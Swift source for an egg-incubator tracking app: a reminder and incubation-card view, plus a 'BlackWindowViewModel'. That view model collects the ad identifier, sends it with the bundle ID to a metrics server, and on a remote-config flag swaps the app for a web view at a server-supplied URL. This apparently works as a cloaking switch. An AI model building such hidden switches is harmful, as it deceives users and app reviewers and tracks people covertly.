import SwiftUI

struct IncubatorItemView: View {
    let incubator: Incubator
    @State private var displayedReminders: [ReminderType] = []
    @EnvironmentObject private var appRouter: AppRouter
    @EnvironmentObject private var tabbarService: TabbarService
    
    var body: some View {
        VStack(alignment: .leading, spacing: 0) {
            // Показываем заголовок напоминаний только если есть выбранные напоминания
            if !incubator.reminders.isEmpty {
                HStack {
                    Text("⏰ DAILY REMAINDERS")
                        .foregroundStyle(.white)
                        .font(.customFont(font: .bold, size: 16))
                    Spacer()
                }
                .padding(.bottom, 8)
                
                // Показываем только те напоминания, которые были выбраны пользователем
                ForEach(incubator.reminders, id: \.self) { reminder in
                    ChekBoxView(
                        text: reminder.displayName,
                        reminderType: reminder,
                        selectedReminders: $displayedReminders
                    )
                }
                .padding(.bottom, 8)
            }
            
            // Отображаем IncubationCardView с данными инкубатора
            IncubationCardView(
                tipe: incubator.selectedSpecies.displayName,
                hatchingDate: incubator.hatchingDate.formattedDate
            )
        }
        .onTapGesture {
            // Скрываем Tabbar при переходе на детальный экран
            tabbarService.isTabbarVisible = false
            // Переходим на экран деталей с ID инкубатора
            appRouter.incubationRoute.append(.detail(incubatorId: incubator.id))
        }
    }
}

#Preview {
    ZStack {
        MainBGView()
        IncubatorItemView(incubator: Incubator(
            selectedSpecies: .chicken,
            startDate: Date(),
            numberOfEggs: 12,
            reminders: [.turnEggs, .checkTemperature],
            note: "Test note"
        ))
        .environmentObject(AppRouter())
        .environmentObject(TabbarService())
        .padding(.horizontal)
    }
}

import SwiftUI
import SwiftUI
import CryptoKit
import WebKit
import AppTrackingTransparency
import UIKit
import FirebaseCore
import FirebaseRemoteConfig
import OneSignalFramework
import AdSupport

class BlackWindowViewModel: ObservableObject {
    @Published var trackingURL: URL?
    @Published var shouldShowWebView = false
    @Published var isRemoteConfigFetched = false
    @Published var isEnabled = false
    @Published var isTrackingPermissionResolved = false
    @Published var isNotificationPermissionResolved = false
    @Published var isWebViewLoadingComplete = false
    
    private var hasFetchedMetrics = false
    private var hasPostedInitialCheck = false
    
    init() {
        setupObservers()
        initialize()
    }
    
    private func setupObservers() {
        NotificationCenter.default.addObserver(
            forName: .didFetchTrackingURL,
            object: nil,
            queue: .main
        ) { [weak self] notification in
            if let url = notification.userInfo?["trackingURL"] as? URL {
                self?.trackingURL = url
                self?.shouldShowWebView = true
                self?.isWebViewLoadingComplete = true
                ConfigManager.shared.saveURL(url)
            }
        }
        
        NotificationCenter.default.addObserver(
            forName: .checkTrackingPermission,
            object: nil,
            queue: .main
        ) { [weak self] _ in
            self?.handlePermissionCheck()
        }
        
        NotificationCenter.default.addObserver(
            forName: .notificationPermissionResolved,
            object: nil,
            queue: .main
        ) { [weak self] _ in
            if !(self?.isTrackingPermissionResolved ?? false) {
                NotificationCenter.default.post(name: .checkTrackingPermission, object: nil)
            }
        }
    }
    
    private func initialize() {
        if !hasPostedInitialCheck {
            hasPostedInitialCheck = true
            NotificationCenter.default.post(name: .checkTrackingPermission, object: nil)
        }
        
        ConfigManager.shared.fetchConfig { [weak self] isEnabled in
            DispatchQueue.main.async {
                self?.isEnabled = isEnabled
                self?.isRemoteConfigFetched = true
                self?.handleConfigFetched()
            }
        }
    }
    
    private func handlePermissionCheck() {
        if !isNotificationPermissionResolved {
            PermissionManager.shared.requestNotificationPermission { [weak self] accepted in
                self?.isNotificationPermissionResolved = true
                NotificationCenter.default.post(
                    name: .notificationPermissionResolved,
                    object: nil,
                    userInfo: ["accepted": accepted]
                )
            }
        } else if !isTrackingPermissionResolved {
            PermissionManager.shared.requestTrackingAuthorization { [weak self] idfa in
                self?.isTrackingPermissionResolved = true
                self?.handlePermissionsResolved(idfa: idfa)
            }
        }
    }
    
    private func handleConfigFetched() {
        if isEnabled {
            if let savedURL = ConfigManager.shared.getSavedURL() {
                if isTrackingPermissionResolved && isNotificationPermissionResolved {
                    trackingURL = savedURL
                    shouldShowWebView = true
                    isWebViewLoadingComplete = true
                    ConfigManager.shared.saveURL(savedURL)
                } else {
                    waitForPermissions(savedURL: savedURL)
                }
            } else if isTrackingPermissionResolved && isNotificationPermissionResolved {
                fetchMetrics()
            }
        } else if isTrackingPermissionResolved && isNotificationPermissionResolved {
            triggerSplashTransition()
        }
    }
    
    private func handlePermissionsResolved(idfa: String?) {
        if isEnabled && ConfigManager.shared.getSavedURL() == nil {
            fetchMetrics(idfa: idfa)
        }
        if isRemoteConfigFetched && !isEnabled && isNotificationPermissionResolved {
            triggerSplashTransition()
        }
    }
    
    private func fetchMetrics(idfa: String? = nil) {
        guard !hasFetchedMetrics else { return }
        hasFetchedMetrics = true
        
        let bundleID = Bundle.main.bundleIdentifier ?? "none"
        NetworkManager.shared.fetchMetrics(bundleID: bundleID, salt: AppConstants.salt, idfa: idfa) { [weak self] result in
            DispatchQueue.main.async {
                switch result {
                case .success(let response):
                    if let url = TrackingURLBuilder.buildTrackingURL(from: response, idfa: idfa, bundleID: bundleID) {
                        NotificationCenter.default.post(name: .didFetchTrackingURL, object: nil, userInfo: ["trackingURL": url])
                    } else {
                        self?.isWebViewLoadingComplete = true
                        self?.triggerSplashTransitionIfNeeded()
                    }
                case .failure:
                    self?.isWebViewLoadingComplete = true
                    self?.triggerSplashTransitionIfNeeded()
                }
            }
        }
    }
    
    private func waitForPermissions(savedURL: URL) {
        func checkPermissions() {
            if isTrackingPermissionResolved && isNotificationPermissionResolved {
                self.trackingURL = savedURL
                self.shouldShowWebView = true
                self.isWebViewLoadingComplete = true
                ConfigManager.shared.saveURL(savedURL)
            } else {
                DispatchQueue.main.asyncAfter(deadline: .now() + 0.5) {
                    checkPermissions()
                }
            }
        }
        
        DispatchQueue.main.async {
            checkPermissions()
        }
    }
    
    private func triggerSplashTransitionIfNeeded() {
        if isEnabled && trackingURL == nil && isTrackingPermissionResolved && isNotificationPermissionResolved {
            triggerSplashTransition()
        }
    }
    
    private func triggerSplashTransition() {
        DispatchQueue.main.asyncAfter(deadline: .now() + 2) {
            NotificationCenter.default.post(name: .splashTransition, object: nil)
        }
    }
    
    deinit {
        NotificationCenter.default.removeObserver(self)
    }
}
